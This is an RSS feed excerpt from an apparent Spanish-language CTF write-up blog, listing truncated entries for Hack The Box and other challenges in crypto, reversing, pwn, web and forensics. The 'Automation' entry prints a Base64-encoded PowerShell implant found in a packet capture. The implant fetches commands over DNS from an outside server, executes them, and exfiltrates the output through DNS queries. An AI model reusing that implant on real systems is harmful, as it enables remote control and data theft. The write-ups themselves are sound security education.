def encode(message): return hex(bytes_to_long(b64encode(message))) Como se puede ver, la flag se convierte a codificación Base64, luego a un número decimal y finalmente a formato hexadecimal.</description></item><item><title>Android-in-the-middle</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/android-in-the-middle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/android-in-the-middle/</guid><description>Se nos proporciona el código fuente en Python para lanzar una instancia en local del reto:
$ python3 source.py $ nc 127.0.0.1 1337 DEBUG MSG - Generating The Global DH Parameters DEBUG MSG - g = 2, p = 10177459997049772558637057109490700048394574760284564283959324525695097805837401714582821820424475480057537817583807249627119267268524840254542683041588432363128111683358536204391767254517057859973149680238170237977230020947732558089671785239121778309357814575486749623687357688511361367822815452806637006568922401890961240475060822815400430220536180181951862931844638638933951683988349468373510128406899660648258602475728913837826845743111489145006566908004165703542907243208106044538037004824530893555918497937074663828069774495573109072469750423175863678445547058247156187317168731446722852098571735569138516533993 DEBUG MSG - Calculation Complete DEBUG MSG - Generating The Public Key of CPU... DEBUG MSG - Calculation Complete DEBUG MSG - Public Key is: ??? Enter The Public Key of The Memory: Mirando el código fuente, vemos que el programa espera un número $M$ para generar un secreto compartido.</description></item><item><title>Anti Flag</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/anti-flag/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/anti-flag/</guid><description>Se nos proporciona un binario llamado anti_flag:
$ file anti_flag anti_flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b8de97bc12c627606510140e43fc13e2efffcee5, for GNU/Linux 3.2.0, stripped Descompilación Si lo abrimos en Ghidra, veremos esta función main:
/* WARNING: Removing unreachable block (ram,0x00101525) */ undefined8 main(undefined8 param_1, undefined8 param_2, undefined8 param_3, undefined8 param_4, undefined8 param_5, undefined8 param_6) { size_t sVar1; long lVar2; sVar1 = strlen(&amp;amp;DAT_00102011); malloc(sVar1 &amp;lt;&amp;lt; 2); lVar2 = ptrace(PTRACE_TRACEME, 0, 1, 0, param_5, param_6, param_2); if (lVar2 == -1) { puts("</description></item><item><title>Antidote</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/antidote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/antidote/</guid><description>Se nos proporciona un binario ARM de 32 bits llamado antidote:
Arch: arm-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8000) Ingeniería inversa Podemos usar Ghidra para analizar el binario y mirar al código en C descompilado. Esta es la función main:
int main() { undefined data[64]; undefined message[152]; setvbuf(stdout, (char *) 0x0, 2, 0); memcpy(message, "Bzzzzzzz... Bzzzzzzzzzzzzzzz... Damn those bugs!\nCome on, hurry up analyzing that bug\'s DNA!</description></item><item><title>APKrypt</title><link>https://7rocky.github.io/ctf/htb-challenges/mobile/apkrypt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/mobile/apkrypt/</guid><description>Se nos proporciona un archivo APK (APKrypt.apk). Tenemos que encontrar un código VIP en el archivo APK. Por tanto, utilizaremos d2j-dex2jar para conseguir un archivo JAR:
$ d2j-dex2jar APKrypt.apk dex2jar APKrypt.apk -> ./APKrypt-dex2jar.jar Análisis del código fuente Ahora podemos subir el archivo JAR a www.javadecompilers.com y seleccionar Jadx como descompilador.
El archivo principal es sources/com/example/apkrypt/MainActivity.java:
package com.example.apkrypt; import android.app.Activity; import android.os.Bundle; import android.util.Base64; import android.view.View; import android.widget.Button; import android.widget.EditText; import android.</description></item><item><title>arcsin1</title><link>https://7rocky.github.io/ctf/imaginaryctf/arcsin1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/arcsin1/</guid><description>Se nos pide calcular -arcsin(-1) * 0.2 (en radianes) y coger los dígitos entre las posiciones 10000 y 10099 de la parte decimal del resultado.
Antes que nada, vamos a aplicar matemáticas:
$$ \sin{\left(\frac{-\pi}{2}\right)} = -1 \iff \arcsin{(-1)} = \frac{-\pi}{2} $$ Nótese que la función arco coseno está acotada: $\frac{-\pi}{2} \leq \arcsin{x} \leq \frac{\pi}{2}$ for $x \in \mathbb{R}$. Por tanto:
$$ -\arcsin{(-1)} \cdot 0.2 = - \left(\frac{-\pi}{2}\right) \cdot 0.2 = \frac{\pi}{10} $$ Entonces, nos preguntan por las dígitos de $\pi$ entre las posiciones 10000 y 10099.</description></item><item><title>Arranged</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/arranged/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/arranged/</guid><description>Se nos proporciona el código fuente en SageMath para cifrar la flag:
from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import long_to_bytes from hashlib import sha256 from secret import FLAG, p, b, priv_a, priv_b F = GF(p) E = EllipticCurve(F, [726, b]) G = E(926644437000604217447316655857202297402572559368538978912888106419470011487878351667380679323664062362524967242819810112524880301882054682462685841995367, 4856802955780604241403155772782614224057462426619061437325274365157616489963087648882578621484232159439344263863246191729458550632500259702851115715803253) A = G * priv_a B = G * priv_b print(A) print(B) C = priv_a * B assert C == priv_b * A # now use it as shared secret secret = C[0] hash = sha256() hash.</description></item><item><title>Art</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/art/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/art/</guid><description>Se nos proporciona una imagen PNG llamada art.png:
$ file art.png art.png: PNG image data, 300 x 300, 8-bit/color RGBA, non-interlaced Podríamos pensar que la flag se esconde en los colores que aparecen en la imagen. No obstante, después de un poco de investigación, encontramos que exista un lenguaje esotérico llamado npiet que codifica texto en imágenes mediante colores:
Los ejemplos se asemejan bastante a lo que tenemos, por lo que vamos a probar:</description></item><item><title>Artifact Of Dangerous Sighting</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/artifact-of-dangerous-sighting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/artifact-of-dangerous-sighting/</guid><description>Se nos proporciona una imagen de disco de Windows dentro de una carpeta llamada HostEvidence_PANDORA:
$ file HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx: Microsoft Disk Image eXtended, by .NET DiscUtils, sequence 0x8, NO Log Signature; region, 2 entries, id Metadata, at 0x200000, Required 1, id BAT, at 0x300000, Required 1 Si cambiamos a una máquina de Windows y montamos la imagen del disco, tendremos las siguientes carpetas:
Analizando la imagen del disco Básicamente, tenemos la unidad C:\ de una máquina de Windows.</description></item><item><title>Artifacts of Dangerous Sightings</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/artifacts-of-dangerous-sightings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/artifacts-of-dangerous-sightings/</guid><description>Se nos proporciona una imagen de disco de Windows dentro de una carpeta llamada HostEvidence_PANDORA:
$ file HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx: Microsoft Disk Image eXtended, by .NET DiscUtils, sequence 0x8, NO Log Signature; region, 2 entries, id Metadata, at 0x200000, Required 1, id BAT, at 0x300000, Required 1 Si cambiamos a una máquina de Windows y montamos la imagen del disco, tendremos las siguientes carpetas:
Analizando la imagen del disco Básicamente, tenemos la unidad C:\ de una máquina de Windows.</description></item><item><title>Auth-or-out</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/auth-or-out/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/auth-or-out/</guid><description>Se nos proporciona un binario de 64 bits llamado auth-or-out:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Si lo ejecutamos, tenemos un menú típico de un reto de explotación del heap:
$ ./auth-or-out *** Welcome to DZONERZY authors editor v0.11.2 *** 1 - Add Author 2 - Modify Author 3 - Print Author 4 - Delete Author 5 - Exit Choice: Ingeniería inversa Vamos a usar Ghidra para obtener el código fuente descompilado en C.</description></item><item><title>Automation</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/automation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/automation/</guid><description>Se nos proporciona un archivo PCAP con muchos paquetes:
Tráfico HTTP Si filtramos por HTTP, veremos algunas peticiones y respuestas:
Como se puede ver, la víctima está descargando un archivo exe. Esta vez no analizaremos el archivo binario. Obsérvese que hay una petición web sospechosa a /desktop.png. La respuesta contiene datos codificados en Base64:
Análisis de PowerShell Si los decodificamos, obtendremos un script en PowerShell:
$ echo 'ZnVuY3Rpb24gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QoJGtleSwgJElWKSB7CiAgICAkYWVzTWFuYWdlZCA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzTWFuYWdlZCIKICAgICRhZXNNYW5hZ2VkLk1vZGUgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6Q0JDCiAgICAkYWVzTWFuYWdlZC5QYWRkaW5nID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpaZXJvcwogICAgJGFlc01hbmFnZWQuQmxvY2tTaXplID0gMTI4CiAgICAkYWVzTWFuYWdlZC5LZXlTaXplID0gMjU2CiAgICBpZiAoJElWKSB7CiAgICAgICAgaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpIHsKICAgICAgICAgICAgJGFlc01hbmFnZWQuSVYgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRJVikKICAgICAKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRhZXNNYW5hZ2VkLklWID0gJElWCiAgICAgCgogICAgICAgIH0KICAgIH0KICAgIGlmICgka2V5KSB7CgogICAgICAgIGlmICgka2V5LmdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRrZXkpCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSAka2V5CiAgICAgICAgfQogICAgfQogICAgJGFlc01hbmFnZWQKfQoKZnVuY3Rpb24gQ3JlYXRlLUFlc0tleSgpIHsKICAKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRhZXNNYW5hZ2VkLktleSkKfQoKZnVuY3Rpb24gRW5jcnlwdC1TdHJpbmcoJGtleSwgJHVuZW5jcnlwdGVkU3RyaW5nKSB7CiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1bmVuY3J5cHRlZFN0cmluZykKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleQogICAgJGVuY3J5cHRvciA9ICRhZXNNYW5hZ2VkLkNyZWF0ZUVuY3J5cHRvcigpCiAgICAkZW5jcnlwdGVkRGF0YSA9ICRlbmNyeXB0b3IuVHJhbnNmb3JtRmluYWxCbG9jaygkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOwogICAgW2J5dGVbXV0gJGZ1bGxEYXRhID0gJGFlc01hbmFnZWQuSVYgKyAkZW5jcnlwdGVkRGF0YQogICAgJGFlc01hbmFnZWQuRGlzcG9zZSgpCiAgICBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRmdWxsRGF0YSkucmVwbGFjZSgiLSIsIiIpCn0KCmZ1bmN0aW9uIERlY3J5cHQtU3RyaW5nKCRrZXksICRlbmNyeXB0ZWRTdHJpbmdXaXRoSVYpIHsKICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGVuY3J5cHRlZFN0cmluZ1dpdGhJVikKICAgICRJViA9ICRieXRlc1swLi4xNV0KICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgICRkZWNyeXB0b3IgPSAkYWVzTWFuYWdlZC5DcmVhdGVEZWNyeXB0b3IoKTsKICAgICR1bmVuY3J5cHRlZERhdGEgPSAkZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJGJ5dGVzLCAxNiwgJGJ5dGVzLkxlbmd0aCAtIDE2KTsKICAgICRhZXNNYW5hZ2VkLkRpc3Bvc2UoKQogICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJHVuZW5jcnlwdGVkRGF0YSkuVHJpbShbY2hhcl0wKQp9CgpmaWx0ZXIgcGFydHMoJHF1ZXJ5KSB7ICR0ID0gJF87IDAuLlttYXRoXTo6Zmxvb3IoJHQubGVuZ3RoIC8gJHF1ZXJ5KSB8ICUgeyAkdC5zdWJzdHJpbmcoJHF1ZXJ5ICogJF8sIFttYXRoXTo6bWluKCRxdWVyeSwgJHQubGVuZ3RoIC0gJHF1ZXJ5ICogJF8pKSB9fSAKJGtleSA9ICJhMUU0TVV0eWNXc3dUbXRyTUhkcWRnPT0iCiRvdXQgPSBSZXNvbHZlLURuc05hbWUgLXR5cGUgVFhUIC1EbnNPbmx5IHdpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODl8U2VsZWN0LU9iamVjdCAtUHJvcGVydHkgU3RyaW5nczsKZm9yICgkbnVtID0gMCA7ICRudW0gLWxlICRvdXQuTGVuZ3RoLTI7ICRudW0rKyl7CiRlbmNyeXB0ZWRTdHJpbmcgPSAkb3V0WyRudW1dLlN0cmluZ3NbMF0KJGJhY2tUb1BsYWluVGV4dCA9IERlY3J5cHQtU3RyaW5nICRrZXkgJGVuY3J5cHRlZFN0cmluZwokb3V0cHV0ID0gaWV4ICRiYWNrVG9QbGFpblRleHQ7JHByID0gRW5jcnlwdC1TdHJpbmcgJGtleSAkb3V0cHV0fHBhcnRzIDMyClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5IHN0YXJ0LndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKZm9yICgkYW5zID0gMDsgJGFucyAtbHQgJHByLmxlbmd0aC0xOyAkYW5zKyspewokZG9tYWluID0gLWpvaW4oJHByWyRhbnNdLCIud2luZG93c2xpdmV1cGRhdGVyLmNvbSIpClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5ICRkb21haW4gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKICAgIH0KUmVzb2x2ZS1EbnNOYW1lIC10eXBlIEEgLURuc09ubHkgZW5kLndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKfQ==' | base64 -d function Create-AesManagedObject($key, $IV) { $aesManaged = New-Object "</description></item><item><title>baby auth</title><link>https://7rocky.github.io/ctf/htb-challenges/web/baby-auth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/baby-auth/</guid><description>Se nos proporciona esta página web:
Primero, nos podemos registrar (nombre asdf, por ejemplo):
Luego, nos dicen que no somos admin. De hecho, la autenticación se gestiona con cookies de sesión:
La cookie se sesión parece codificada en Base64, por lo que vamos a decodificarla (cuidado con la codificación de URL):
$ echo eyJ1c2VybmFtZSI6ImFzZGYifQ== | base64 -d {"username":"asdf"} Muestra nuestro nombre de usuario, a lo mejor podemos modificar la cookie y ganar acceso como admin:</description></item><item><title>baby BoneChewerCon</title><link>https://7rocky.github.io/ctf/htb-challenges/web/baby-bonechewercon/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/baby-bonechewercon/</guid><description>Se nos proporciona esta página web:
Al final de la página podemos introducir texto. Vamos a poner algo y a enviarlo.
Se nos muestra un error en el depurador de Laravel (un framework de PHP):
Esto es una mala práctica y un problema de seguridad, ya que los depuradores pueden contener información sensible y muchos de ellos proporcionan maneras de ejecutar código.
Flag De hecho, podemos encontrar la flag en una variable de entorno llamada APP_KEY:</description></item><item><title>baby breaking grad</title><link>https://7rocky.github.io/ctf/htb-challenges/web/baby-breaking-grad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/baby-breaking-grad/</guid><description>Tenemos esta página web:
Vamos a pinchar en el botón:
Análisis de código fuente Muy bien, ya que se nos proporciona el código fuente, echémosle un vistazo. Es un proyecto en Node.js usando Express JS. Este es index.js:
const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const routes = require('./routes'); const path = require('path'); app.use(bodyParser.json()); app.set('views','./views'); app.use('/static', express.static(path.resolve('static'))); app.use(routes); app.all('*', (req, res) =&amp;gt; { return res.status(404).send('404 page not found'); }); app.</description></item><item><title>baby CachedView</title><link>https://7rocky.github.io/ctf/htb-challenges/web/baby-cachedview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/baby-cachedview/</guid><description>Tenemos una aplicación web en Flask que nos permite renderizar otras páginas web como una imagen:
Por detrás, el servidor lanza un Headless Chrome con selenium, accede a la página que le indicamos y toma una captura de pantalla para mostrarla. Aquí hay un ejemplo:
El objetivo es llegar a la ruta /flag:
@web.route('/flag') @is_from_localhost def flag(): return send_file('flag.png') Sin embargo, está protegida verificando que la petición se realiza desde 127.</description></item><item><title>Baby Crypt</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/baby-crypt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/baby-crypt/</guid><description>Se nos proporciona un binario llamado baby_crypt:
$ file baby_crypt baby_crypt: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=24af7e68eab982022ea63c1828813c3bfa671b51, for GNU/Linux 3.2.0, not stripped Si lo abrimos en Ghidra, veremos esta función main:
int main() { char *key; long in_FS_OFFSET; int i; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined2 local_20; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); printf("Give me the key and I\'ll give you the flag: "</description></item><item><title>baby interdimensional internet</title><link>https://7rocky.github.io/ctf/htb-challenges/web/baby-interdimensional-internet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/baby-interdimensional-internet/</guid><description>Se nos proporciona esta página web:
Si miramos el código HTML de la página, veremos /debug:
Y ahí tenemos el código fuente de la aplicación web:
from flask import Flask, Response, request, render_template, request from random import choice, randint from string import lowercase from functools import wraps app = Flask(__name__) def calc(recipe): global garage garage = {} try: exec(recipe, garage) except: pass def GCR(func): # Great Calculator of the observable universe and it's infinite timelines @wraps(func) def federation(*args, **kwargs): ingredient = ''.</description></item><item><title>baby nginxatsu</title><link>https://7rocky.github.io/ctf/htb-challenges/web/baby-nginxatsu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/baby-nginxatsu/</guid><description>Se nos proporciona esta página web:
Después de registrar una cuenta e iniciar sesión, veremos esta funcionalidad:
Básicamente, nos permiten crear archivos de configuración de nginx.
Explotación de nginx Nótese que el campo location es /storage. Vamos a crear la configuración que viene por defecto a ver qué sale:
Tenemos esta configuración:
user www; pid /run/nginx.pid; error_log /dev/stderr info; events { worker_connections 1024; } http { server_tokens off; charset utf-8; keepalive_timeout 20s; sendfile on; tcp_nopush on; client_max_body_size 2M; include /etc/nginx/mime.</description></item><item><title>baby ninja jinja</title><link>https://7rocky.github.io/ctf/htb-challenges/web/baby-ninja-jinja/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/baby-ninja-jinja/</guid><description>Se nos proporciona esta página web:
Existe un comentario en el código HTML de la página que indica una URL de depuración (/debug):
En esta ruta /debug, podemos encontrar el código fuente:
$ curl 157.245.33.77:31650/debug from flask import Flask, session, render_template, request, Response, render_template_string, g import functools, sqlite3, os app = Flask(__name__) app.config['SECRET_KEY'] = os.urandom(120) acc_tmpl = '''{% extends 'index.html' %} {% block content %} &amp;lt;h3&amp;gt;baby_ninja joined, total number of rebels: reb_num&amp;lt;br&amp;gt; {% endblock %} ''' def get_db(): db = getattr(g, '_database', None) if db is None: db = g.</description></item><item><title>baby quick maffs</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/baby-quick-maffs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/baby-quick-maffs/</guid><description>Se nos proporciona este código en Python para cifrar la flag, y nos dan el archivo output.txt:
#!/usr/bin/env python3 from secret import flag, p, q from Crypto.Util.number import bytes_to_long from random import randint def partition_message(m, N): m1 = randint(1, N) parts = [] remainder = 0 while sum(parts) &amp;lt; m: if sum(parts) + m1 &amp;lt; m: parts.append(m1) else: remainder = m - sum(parts) parts.append(m1 + remainder) return (parts, remainder) def encode(message, N): m = bytes_to_long(message) parts, remainder = partition_message(m, N) ciphers = [pow(c, 2, N) for c in parts] return (ciphers, remainder) N = p * q ciphers, remainder = encode(flag, N) with open("</description></item><item><title>Baby RE</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/baby-re/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/baby-re/</guid><description>Se nos proporciona un binario llamado baby:
$ file baby baby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=25adc53b89f781335a27bf1b81f5c4cb74581022, for GNU/Linux 3.2.0, not stripped Si lo ejecutamos, pregunta por una clave:
$ ./baby Insert key: Podemos introducir una clave y ver que no es correcta:
$ ./baby Insert key: 1234 Try again later. Podemos hacer uso de ltrace para ver las llamadas a funciones externas (funciones que pertenecen a librerías como Glibc):</description></item><item><title>baby todo or not todo</title><link>https://7rocky.github.io/ctf/htb-challenges/web/baby-todo-or-not-todo/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/baby-todo-or-not-todo/</guid><description>Se nos proporciona esta página web:
Análisis de código fuente También se nos proporciona el código fuente, que es una aplicación en Flask (Python). Esto es application/app.py:
from flask import Flask, session, g from flask.json import JSONEncoder from application.blueprints.routes import main, api from application.util import generate from application.database import get_db from application.models import todo import time class toJSON(JSONEncoder): def default(self, obj): if isinstance(obj, todo): return { 'id' : obj.id, 'name' : obj.</description></item><item><title>baby WAFfles order</title><link>https://7rocky.github.io/ctf/htb-challenges/web/baby-waffles-order/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/baby-waffles-order/</guid><description>Se nos proporciona esta página web:
Análisis de código estático También tenemos el código fuente en PHP. Esto es index.php:
&amp;lt;?php spl_autoload_register(function ($name){ if (preg_match('/Controller$/', $name)) { $name = "controllers/${name}"; } include_once "${name}.php"; }); $router = new Router(); $router-&amp;gt;new('GET', '/', fn($router) =&amp;gt; $router-&amp;gt;view('menu')); $router-&amp;gt;new('POST', '/api/order', 'OrderController@order'); die($router-&amp;gt;match()); Aquí solamente hay dos rutas. La que parece más interesante es la que está gestionada por OrderController.php:
&amp;lt;?php class OrderController { public function order($router) { $body = file_get_contents('php://input'); if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json') { $order = json_decode($body); if (!</description></item><item><title>baby website rick</title><link>https://7rocky.github.io/ctf/htb-challenges/web/baby-website-rick/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/baby-website-rick/</guid><description>Se nos proporciona esta página web:
Analizando el sitio web Esta vez, no tenemos código fuente para analizar. Sin embargo, la imagen de arriba muestra algo sospechoso:
&lt;__main__.anti_pickle_serum object at 0x7f0ed62d1810> Esto parece una clase de Python:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; class Test(): ... pass ... &amp;gt;&amp;gt;&amp;gt; Test() &amp;lt;__main__.Test object at 0x1007fbd30&amp;gt; También, tenemos una cookie llamada plan_b:
Esto parece una cadena codificada en Base64:
&amp;gt;&amp;gt;&amp;gt; from base64 import b64encode as b64e, b64decode as b64d &amp;gt;&amp;gt;&amp;gt; b64d('KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu') b"</description></item><item><title>baby-talk</title><link>https://7rocky.github.io/ctf/other/dicectf/baby-talk/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/dicectf/baby-talk/</guid><description>Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled El programa nos ofrece cuatro opciones:
$ ./chall 1. str 2. tok 3. del 4. exit &amp;gt; Ingeniería inversa Si abrimos el binario en Ghidra, veremos el siguiente código en C descompilado. La función main gestiona las opciones y llama a la función correspondiente:
int main() { ulong option; setbuf(stdout, NULL); do { while (true) { while (true) { print_menu(); printf("</description></item><item><title>babyreeee</title><link>https://7rocky.github.io/ctf/other/seetf/babyreeee/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/seetf/babyreeee/</guid><description>Se nos proporciona un binario llamado chall:
$ file chall chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=151528987cd274999ec93665ef2d6a7678c5107b, for GNU/Linux 3.2.0, stripped Si lo ejecutamos, nos pregunta por la flag:
$ ./chall Hello! Welcome to SEETF. Please enter the flag. SEE{asdf} Flag wrong. Try again. Vamos a abrir el binario en Ghidra para analizar el código en C descompilado. Esta es la función main.</description></item><item><title>Bad JWT</title><link>https://7rocky.github.io/ctf/other/seccon-ctf/bad-jwt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/seccon-ctf/bad-jwt/</guid><description>Se nos proporciona el código fuente de un proyecto de Node.js. Este es index.js:
const FLAG = process.env.FLAG ?? 'SECCON{dummy}'; const PORT = '3000';; const express = require('express'); const cookieParser = require('cookie-parser'); const jwt = require('./jwt'); const app = express(); app.use(express.urlencoded({ extended: false })); app.use(cookieParser()); const secret = require('crypto').randomBytes(32).toString('hex'); app.use((req, res, next) =&amp;gt; { try { const token = req.cookies.session; const payload = jwt.verify(token, secret); req.session = payload; } catch (e) { return res.</description></item><item><title>Bank-er-smith</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/bank-er-smith/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/bank-er-smith/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes, inverse, GCD from secret import FLAG, KEY WELCOME = """ ************** Welcome to the Gringatts Bank. ************** * * * Fortius Quo Fidelius * * * ************************************************************ """ class RSA(): def __init__(self, key_length): self.e = 0x10001 phi = 0 prime_length = key_length // 2 while GCD(self.e, phi) != 1: self.p, self.q = getPrime(prime_length), getPrime(prime_length) phi = (self.</description></item><item><title>Bank-er-smith</title><link>https://7rocky.github.io/ctf/other/htb-unictf/bank-er-smith/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/bank-er-smith/</guid><description>Se nos proporciona el código fuente del servidor en Python:
